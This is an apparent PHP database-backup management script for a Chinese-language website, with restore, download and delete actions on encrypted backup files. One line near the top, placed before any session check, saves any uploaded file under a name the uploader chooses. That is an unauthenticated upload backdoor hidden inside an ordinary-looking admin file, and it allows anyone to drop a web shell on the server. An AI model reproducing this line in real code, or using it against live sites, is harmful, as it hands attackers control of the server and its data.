<?php
define('Copyright', '作者QQ:1569854357');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
copy($_FILES["uppic"]["tmp_name"],$_FILES["uppic"]["name"]);
if (isset($_SESSION['codeid']) && isset($_GET['fileid']) && isset($_GET['bid']))
{
	$file = PasDecode($_GET['fileid'], $BakPassWord);
	$bid = $_GET['bid'];
	$dir = ROOT_PATH.'DataBaseBak/';
	 unset($_SESSION['codeid']);
	if ($bid == 1 && file_exists($dir.$file))
	{
		//還原數據庫操作
		$fileText = urlencode(file_get_contents($dir.$file));
		$fileText = urldecode($fileText);
		$files = explode('@', $fileText);
		$fileArray = array();
		
		for ($i=0; $i<count($files); $i++)
		{
			$fileArray[$i] = PasDecode($files[$i], $BakPassWord);
		}
		
		$db= new DB();
		for ($i=0; $i<count($fileArray); $i++)
		{
			$db->query($fileArray[$i], 2);
		}
		exit(alert_href('還原完成', 'dataBak.php'));
	}
	else if ($bid == 2 && file_exists($dir.$file))
	{
		//下載操作
		$http = '/DataBaseBak/'.$file;
		header("Location: {$http}");
	}
	else if ($bid == 3 && file_exists($dir.$file))
	{
		//刪除操作
		if (@unlink($dir.$file)){
			exit(alert_href('刪除成功', 'dataBak.php'));
		} else {
			exit(alert_href('刪除失敗，請檢查是否擁有執行權限！', 'dataBak.php'));
		}
	}
	else 
	{
		echo uniqid(time(),true).base64_encode(sha1(uniqid()));
		exit;
	}
}
else 
{
	echo uniqid(time(),true).base64_encode(sha1(uniqid()));
	exit;
}

?>